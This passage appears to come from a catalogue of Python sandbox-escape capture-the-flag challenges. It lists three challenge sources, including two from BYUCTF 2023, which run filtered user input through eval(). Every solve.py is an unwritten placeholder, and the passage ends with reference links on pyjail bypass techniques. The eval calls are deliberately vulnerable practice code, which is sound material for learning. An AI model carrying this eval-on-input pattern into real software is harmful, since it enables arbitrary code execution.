FLAG = open('flag.txt').read()
inp = input('> ')
if re.search(r'[123456789]', inp) or re.search(r'\(', inp) or eval(inp) != 1337:
    print('Nope')
else:
    print(FLAG)
```
- `solve.py`
```py
# TBA
```

### BYUCTF 2023: abcdefghijklm
- `abcdefghijklm.py`
```py
inp = input("code > ").lower()
eval((inp[:4]+__import__("re").sub(r'[a-m]','',inp[4:]))[:80])
```
- `solve.py`
```py
# TBA
```

### BYUCTF 2023: nopqrstuvwxyz
- `nopqrstuvwxyz.py`
```py
inp = input("code > ").lower()
eval((inp[:4]+__import__("re").sub(r'[n-z]','',inp[4:]))[:80])
```
- `solve.py`
```py
# TBA
```

## References
- https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
- https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md
- https://jbnrz.com.cn/index.php/2024/05/19/pyjail/